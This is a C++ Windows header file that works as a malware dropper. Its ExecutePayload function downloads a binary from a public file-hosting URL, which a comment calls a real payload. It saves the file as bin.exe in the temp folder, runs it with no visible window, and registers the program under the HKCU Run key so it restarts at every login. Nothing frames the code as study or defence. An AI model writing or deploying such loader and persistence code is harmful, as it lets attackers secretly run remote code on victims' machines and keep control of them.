#pragma once
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

bool DownloadFile(const std::wstring& url, const std::wstring& savePath) {
    HINTERNET hInternet = InternetOpen(L"UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream file(savePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        file.write(reinterpret_cast<char*>(buffer), bytesRead);
    }

    file.close();
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

bool AddToStartup(const std::wstring& appPath) {
    HKEY hKey;
    LSTATUS status = RegOpenKeyEx(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (status != ERROR_SUCCESS) return false;

    status = RegSetValueEx(hKey, L"MyApp", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(appPath.c_str()),
        (appPath.size() + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);
    return status == ERROR_SUCCESS;
}

void ExecutePayload() {
    wchar_t tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);

    std::wstring exePath = std::wstring(tempPath) + L"\\bin.exe";
    std::wstring url = L"https://files.catbox.moe/5ta49e.bin"; // THIS IS A ACT PAYLOAD BE CAREFUL

    if (!DownloadFile(url, exePath)) {
        return;
    }

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(exePath.c_str(), NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    wchar_t modulePath[MAX_PATH];
    GetModuleFileName(NULL, modulePath, MAX_PATH);
    AddToStartup(modulePath);
}
